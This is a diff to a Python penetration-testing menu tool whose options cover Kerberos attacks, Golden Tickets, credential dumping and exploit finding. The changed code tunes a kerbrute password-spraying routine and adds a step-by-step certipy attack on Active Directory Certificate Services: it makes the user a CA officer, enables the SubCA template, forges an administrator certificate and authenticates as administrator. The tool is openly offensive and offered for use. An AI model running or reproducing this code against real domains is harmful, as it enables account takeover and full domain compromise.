@@ -777,8 +777,8 @@ def dispMenu():
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700) FakeCerts template                  " + '\u2551')   
-   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82)             (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (   )                                     " + '\u2551')      
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (11) Re/Set DOMAINSID (31) Get Arch (41) WinLDAP Search (51) Kerberos Info (61) Gold Ticket (71) ServScanner (81) gRPClient   (91 ) FTP      (231) Scan Live PORTS (341) Edit   Usernames (441) Whois DNS    (500) Nuclei Scanner (600) LFI OS Checker (700) Certs List All                      " + '\u2551')   
+   print('\u2551' + "(02) Re/Set DNS ADDRESS (12) Re/Set SUBDOMAIN (32) Net View (42) Look up SecIDs (52) Kerberos Auth (62) Gold DC PAC (72) VulnScanner (82)             (92 ) SSH      (232) TCP PORTS  Scan (342) Edit   Passwords (442) Dig DNS      (501) Nuclei WP Scan (601) LFI   Wordlist (701) Certs Template                      " + '\u2551')      
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Domain Dump (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (502) Wordpress Scan (602) Nuclei LFI     (   )                                     " + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Blood Hound (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (503) WP Plugin Scan (603)                (   )                                     " + '\u2551')
    print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) LAPS Dumper (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (504)                (604)                (   )                                     " + '\u2551')
@@ -1410,6 +1410,7 @@ while True:
          NTM = spacePadding(NTM, COL1)
       else:
          NTM = BAK
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1426,6 +1427,7 @@ while True:
          TGT = spacePadding(TGT, COL1)
       else:
          TGT = BAK
+      prompt()
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -2350,16 +2352,16 @@ while True:
                PAS = "'\'" 
             PAS = spacePadding(PAS, COL1)
             TGT = privCheck()                      
-         if found == 0:
+         if found <= 1:
             print(colored("\n[*] Now trying all usernames with matching passwords...",colour3))
             remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/usernames.txt -outputfile password2.tmp")
             test2 = linecache.getline("password2.tmp", 1)                        
             if test2 != "":
-               found = 1
+               found = found + 1
                USR,PAS = test2.split(":")
                USR = spacePadding(USR, COL1)
                PAS = spacePadding(PAS, COL1)
-               TGT = privCheck()                              
+               TGT = privCheck()
          if found == 0:
             print(colored("\n[*] Now trying all users against password list, please wait as this could take sometime...",colour3))            
             remoteCOM("kerbrute -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -users " + dataDir + "/usernames.txt -passwords " + dataDir + "/passwords.txt -outputfile password3.tmp")                 
@@ -4336,7 +4338,7 @@ while True:
       localCOM("xdotool type 'clear; cat banner.tmp'; xdotool key Return")
       localCOM("xdotool type 'bloodhound'; xdotool key Return")
       localCOM("xdotool key Ctrl+Tab") 
-      prompt()      
+      prompt()   
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -4347,22 +4349,54 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='700':
-      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /all' > priv.tmp")
+      print(colored("[*] Checking privilges...", colour3))      
+      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
       catsFile("priv.tmp")
       with open("priv.tmp") as file:
          contents = file.read()
-         if "SeMachineAccountPrivilege" in contents:   
-            localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout") # This gives manager-DC01-CA 
-            # INPUT FIELD HERE
-            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -add-officer " + USR.rstrip(" ") + " -ca 'manager-DC01-CA'") # manager-DC01-CA replace
-            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -enable-template 'SubCA'")  # manager-DC01-CA and SubCA replace
-            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -template SubCA -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" ")) # This gives 45
-            # INPUT FIELD HERE            
-            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -issue-request 14") #45 replace
-            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca 'manager-DC01-CA' -target " + DOM.rstrip(" ") + " -retrieve 14") #45 replace
+         if "SeMachineAccountPrivilege" in contents:
+            print(colored("[*] Checking certificate authorities...", colour3))            
+            localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout")
+         else:
+            print("[-] SeMachineAccountPrivilege is not enabled...")
+      prompt()    
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - Certipy parsFile
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection =='701':
+      print(colored("[*] Checking privilges...", colour3))      
+      remoteCOM("crackmapexec winrm " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -x 'whoami /priv' > priv.tmp")
+      catsFile("priv.tmp")
+      with open("priv.tmp") as file:
+         contents = file.read()
+         if "SeMachineAccountPrivilege" in contents:
+            print(colored("[*] Checking certificate authorities...", colour3))            
+            localCOM("certipy find -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -dc-ip " + TIP.rstrip(" ") + " -dc-only -stdout > test.tmp")
+            localCOM("cat test.tmp | grep  'Certificate Authorities'")
+            authority = input("\n[?] Please enter authority name to assign: ")
+            print("") 
+            print(colored("\n[*] Checking templates...", colour3))            
+            localCOM("cat test.tmp | grep  'Template Name'")
+            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -add-officer " + USR.rstrip(" ") + " -ca " + authority)            
+            template = input("\n[?] Please enter template name to assign: ")
+            print("")   
+            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -enable-template " + template)
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -template " + template + " -upn administrator@" + DOM.rstrip(" ") + " -target " + DOM.rstrip(" "))
+            templateNumber = input("\n[?] Please enter request id to assign: ")
+            print("")
+            print(colored("[*] Creating fake administrator certificate...", colour3))
+            localCOM("certipy ca -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -issue-request " + templateNumber)
+            localCOM("certipy req -u " + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -ca " + authority + " -target " + DOM.rstrip(" ") + " -retrieve " + templateNumber)
+            print(colored("\n[*] Fake administrator account created...", colour3))
             localCOM("certipy auth -pfx administrator.pfx -dc-ip " + TIP.rstrip(" ") + " -domain " + DOM.rstrip(" ") + " -username administrator")
          else:
-            pass
+            print("[-] SeMachineAccountPrivilege is not enabled...")
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
